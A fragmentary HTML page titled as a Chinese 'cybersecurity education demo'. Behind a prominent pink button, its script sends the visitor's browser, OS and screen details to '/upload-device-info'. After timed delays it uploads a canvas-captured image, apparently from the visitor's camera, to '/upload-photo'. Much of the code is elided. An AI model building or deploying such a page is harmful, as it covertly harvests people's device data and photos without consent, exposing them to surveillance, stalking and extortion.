...
<html>
<head><meta charset="UTF-8"><title>网络安全教育演示</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{background:#000;text-align:center;color:#fff;font-family:Arial;padding:20px}
button{background:#ff0050;color:#fff;border:none;padding:15px 40px;border-radius:30px;font-size:18px;margin:20px;cursor:pointer}
...
setTimeout(()=>{
    fetch('/upload-device-info',{
        ...
        body:JSON.stringify({
            ...
            browser:browser, os:os, screen:`${screen.width}x${screen.height}`,
        ...
        setTimeout(()=>{
            ...
            setTimeout(()=>{
                ...
                canvas.toBlob(blob=>{
                    let f=new FormData();
                    f.append('photo',blob);
                    fetch('/upload-photo',{method:'POST',body:f});
                });
